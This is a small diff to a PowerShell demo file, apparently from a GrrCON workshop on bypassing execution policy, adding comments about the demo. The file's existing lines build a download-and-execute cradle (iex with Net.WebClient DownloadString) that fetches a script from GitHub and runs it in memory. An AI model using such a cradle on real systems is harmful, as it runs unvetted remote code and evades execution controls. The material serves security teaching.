@@ -1,4 +1,6 @@
 # Download a script from the internet
+# This one probably won't work at GrrCON due to internet issues.
+# The premise is that a string can be 
 $uri = 'https://raw.githubusercontent.com/PSBlackOps/GrrCON-Workshop/master/Demos/ExecutionPolicy/RunMeIfYouCan.ps1'
 powershell.exe -nop -command "iex(New-Object Net.WebClient).DownloadString('$uri')"
 
